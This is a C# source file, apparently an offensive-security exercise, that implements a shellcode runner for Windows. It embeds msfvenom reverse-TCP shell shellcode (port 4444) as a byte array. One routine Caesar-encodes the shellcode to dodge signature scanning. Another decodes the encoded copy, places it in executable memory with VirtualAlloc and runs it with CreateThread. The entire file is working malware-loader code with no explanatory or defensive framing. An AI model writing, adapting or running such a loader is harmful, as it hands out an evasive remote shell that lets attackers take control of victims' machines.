using System;
using System.Runtime.InteropServices;
using System.Text;

namespace CaeserLoadShell
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void CaeserEncode(int key)
        {
            //  msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f csharp
            byte[] buf = new byte[460] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x41,0x54,
0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] + key) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(buf.Length * 2);

            for (int i = 0; i < buf.Length - 1; i++)
            {
                hex.AppendFormat("0x{0:x2},", buf[i]);
            }

            hex.AppendFormat("0x{0:x2}", buf[buf.Length - 1]);

            Console.WriteLine("The Caesar encoded payload with key " + key + " is:");

            Console.Write("byte[] buf = new byte[" + buf.Length + "] { ");

            Console.Write(hex.ToString());

            Console.WriteLine("};");

            Console.ReadLine();
        }

        static void CaeserLoadShell(int key)
        {
            // Use Caesar encoded payload
            byte[] buf = new byte[460] { 0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xc2, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x58, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4a, 0x8d, 0x74, 0x52, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4f, 0x33, 0xcb, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x43, 0x53, 0x4a, 0x8d, 0x54, 0x22, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x52, 0x8d, 0x4a, 0x1a, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0xe5, 0x58, 0x4a, 0x01, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4f, 0x33, 0xcb, 0x4a, 0x33, 0xc2, 0xae, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x59, 0x01, 0x01, 0x01, 0x5f, 0x4b, 0xc0, 0x79, 0x75, 0x34, 0x61, 0x35, 0x34, 0x02, 0x02, 0x43, 0x58, 0x4b, 0x8b, 0xe8, 0x4a, 0x83, 0xee, 0xa2, 0x03, 0x02, 0x02, 0x4b, 0x8b, 0xe7, 0x4b, 0xbe, 0x04, 0x02, 0x13, 0x5e, 0x81, 0x02, 0x02, 0x03, 0x43, 0x56, 0x4b, 0x8b, 0xe6, 0x4e, 0x8b, 0xf3, 0x43, 0xbc, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x4e, 0x8b, 0xec, 0x6a, 0x03, 0x03, 0x02, 0x02, 0x5b, 0x43, 0xbc, 0x2b, 0x82, 0x6d, 0x02, 0x01, 0xd7, 0x52, 0x52, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xc2, 0x4a, 0x01, 0xc2, 0x4a, 0x8b, 0xc4, 0x4a, 0x01, 0xc2, 0x4a, 0x8b, 0xc3, 0x43, 0xbc, 0xec, 0x11, 0xe1, 0xe2, 0x01, 0xd7, 0x4a, 0x8b, 0xc9, 0x6c, 0x12, 0x43, 0x5a, 0x4e, 0x8b, 0xe4, 0x4a, 0x8b, 0xfb, 0x43, 0xbc, 0x9b, 0xa7, 0x76, 0x63, 0x01, 0xd7, 0x4a, 0x83, 0xc6, 0x42, 0x04, 0x02, 0x02, 0x4b, 0xba, 0x65, 0x6f, 0x66, 0x02, 0x02, 0x02, 0x02, 0x02, 0x43, 0x52, 0x43, 0x52, 0x4a, 0x8b, 0xe4, 0x59, 0x59, 0x59, 0x4f, 0x33, 0xc2, 0x6c, 0x0f, 0x5b, 0x43, 0x52, 0xe4, 0xfe, 0x68, 0xc9, 0x46, 0x26, 0x56, 0x03, 0x03, 0x4a, 0x8f, 0x46, 0x26, 0x1a, 0xc8, 0x02, 0x6a, 0x4a, 0x8b, 0xe8, 0x58, 0x52, 0x43, 0x52, 0x43, 0x52, 0x43, 0x52, 0x4b, 0x01, 0xc2, 0x43, 0x52, 0x4b, 0x01, 0xca, 0x4f, 0x8b, 0xc3, 0x4e, 0x8b, 0xc3, 0x43, 0xbc, 0x7b, 0xce, 0x41, 0x88, 0x01, 0xd7, 0x4a, 0x33, 0xd4, 0x4a, 0x01, 0xcc, 0x8d, 0x10, 0x43, 0xbc, 0x0a, 0x89, 0x1f, 0x62, 0x01, 0xd7, 0xbd, 0xe2, 0x1f, 0x2c, 0x0c, 0x43, 0xbc, 0xa8, 0x97, 0xbf, 0x9f, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x2a, 0x3e, 0x08, 0x7e, 0x0c, 0x82, 0xfd, 0xe2, 0x77, 0x07, 0xbd, 0x49, 0x15, 0x74, 0x71, 0x6c, 0x02, 0x5b, 0x43, 0x8b, 0xdc, 0x01, 0xd7 };

            int size = buf.Length;

            // decode with key
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - key) & 0xFF);
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        static void Main(string[] args)
        {
            //CaeserEncode(2);
            CaeserLoadShell(2);
        }
    }
}
